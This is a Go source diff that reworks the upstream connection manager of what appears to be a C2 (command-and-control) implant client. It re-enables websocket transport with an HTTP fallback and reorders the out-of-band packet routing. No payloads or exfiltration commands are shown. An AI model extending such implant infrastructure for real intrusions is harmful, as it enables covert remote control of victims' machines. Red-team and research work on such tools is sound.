@@ -23,23 +23,21 @@ if d.campaign.ClientUseWebsocket {
 type UpstreamManager struct {
 	Channel chan model.Packet
 
-	config *ClientConfig
-	//campaign *campaign.Campaign
+	config   *ClientConfig
+	campaign *campaign.Campaign
 
 	UpstreamHttp Upstream
 	UpstreamWs   Upstream
 }
 
 func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) UpstreamManager {
-	//coder := model.MakeCoder(campaign)
-
 	upstreamHttp := MakeUpstreamHttp(config, campaign)
 	upstreamWs := MakeUpstreamWs(config, campaign)
 
 	u := UpstreamManager{
-		Channel: make(chan model.Packet),
-		config:  config,
-		//campaign: campaign,
+		Channel:      make(chan model.Packet),
+		config:       config,
+		campaign:     campaign,
 		UpstreamHttp: &upstreamHttp,
 		UpstreamWs:   &upstreamWs,
 	}
@@ -48,14 +46,13 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 
 // Connect will until the C2 can be reached
 func (d *UpstreamManager) Connect() error {
-	/*
+	if d.campaign.ClientUseWebsocket {
 		// Try: Websocket
 		err := d.UpstreamWs.Connect()
 		if err != nil {
 			return err
 		}
 		d.UpstreamWs.Start()
-		d.sendPing()
 
 		var packet model.Packet
 		go func() {
@@ -66,24 +63,27 @@ func (d *UpstreamManager) Connect() error {
 				packet = <-d.Channel
 				d.UpstreamWs.OobChannel() <- packet
 			}
-		}()*/
+		}()
 
-	// Try: HTTP
-	err := d.UpstreamHttp.Connect()
-	if err != nil {
-		return err
+		d.sendPing() // AFTER the thread above
+	} else {
+		// Try: HTTP
+		err := d.UpstreamHttp.Connect()
+		if err != nil {
+			return err
+		}
+		d.UpstreamHttp.Start()
+		//d.sendPing()
+
+		var packet model.Packet
+		go func() {
+			packet = <-d.UpstreamHttp.Channel()
+			d.Channel <- packet
+
+			packet = <-d.Channel
+			d.UpstreamHttp.OobChannel() <- packet
+		}()
 	}
-	d.UpstreamHttp.Start()
-	//d.sendPing()
-
-	var packet model.Packet
-	go func() {
-		packet = <-d.UpstreamHttp.Channel()
-		d.Channel <- packet
-
-		packet = <-d.Channel
-		d.UpstreamHttp.OobChannel() <- packet
-	}()
 
 	// Wait
 
@@ -91,10 +91,10 @@ func (d *UpstreamManager) Connect() error {
 }
 
 func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
-	if d.UpstreamHttp.Connected() {
-		d.UpstreamHttp.OobChannel() <- packet
-	} else if d.UpstreamWs.Connected() {
+	if d.UpstreamWs.Connected() {
 		d.UpstreamWs.OobChannel() <- packet
+	} else if d.UpstreamHttp.Connected() {
+		d.UpstreamHttp.OobChannel() <- packet
 	} else {
 		log.Warn("OOB: No active upstreams, dont send")
 	}
